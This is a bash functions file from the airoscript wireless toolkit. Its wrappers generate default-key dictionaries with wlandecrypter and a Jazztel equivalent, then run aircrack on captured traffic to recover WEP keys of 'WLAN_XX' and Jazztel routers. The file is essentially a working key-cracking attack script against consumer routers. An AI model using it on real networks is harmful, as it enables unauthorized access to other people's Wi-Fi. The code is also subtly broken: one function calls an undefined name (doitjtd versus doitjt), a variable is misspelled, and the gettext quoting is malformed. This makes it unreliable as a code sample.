#!/bin/bash
# Unstable functions file for airoscript.
# Requires: wlandecrypter 
# By David Francos (XayOn) <yo.orco@gmail.com>
echo -e "\tExternal functions from airoscript loaded,\n\tif you don't want this, set EXTERNAL=0 in\n\tconfig file"

function doitwld {
	$WLD $Host_MAC $Host_SSID $DUMP_PATH/wlddic 
	$AIRCRACKOLD $FORCEWEPKOREK -b $Host_MAC -w $DUMP_PATH/wlddic $DUMP_PATH/$Host_MAC-01.cap
}

function wld {
	if [ $Host_MAC ] 
	then

			START=`echo $Host_SSID|cut -d_ -f1`
			case $START in
				WLAN ) 
					echo "I'll try to crack it now"
					if [ -e $DUMP_PATH/$Host_MAC-01.cap ]
					then	
						doitwld
					else
						echo "`gettext 'No capture file. You will have to capture some ivs first to use wlandecrypter.'` $DUMP_paTH/$Host_MAC"
					fi
					;;
				*)
					clear
					echo "`gettext 'Sorry, your target is not supported (not WLAN_XX type)'`"
					;;
			esac
				
	else
		clear
		echo -e "gettext `'Error: You must select a client before performing this attack.'`\n"
	fi
	
}


function doitjt {
	$JTD $Host_MAC $Host_SSID $DUMP_PATH/jtddic
	$AIRCRACKOLD $FORCEWEPKOREK -b $Host_MAC -w $DUMP_PATH/jtddic $DUMP_PATH/$Host_MAC-01.cap
}

function jtd {
	if [ $Host_MAC ] 
	then

			START=`echo $Host_SSID|cut -d_ -f1`
			case $START in
				WLAN ) 
					echo "`gettext 'I will try to crack it now'`"
					if [ -e $DUMP_PATH/$Host_MAC-01.cap ]
					then	
						doitjtd
					else
						echo "`gettext 'No capture file. You will have to capture some ivs first to use wlandecrypter.'`"
					fi
					;;
				*)
					clear
					echo "`gettext 'Sorry, your target is not supported (not jazztel type)'`"
					;;
			esac
				
	else
		clear
		echo -e "gettext `'Error: You must select a client before performing this attack.'`\n"
	fi
	
}
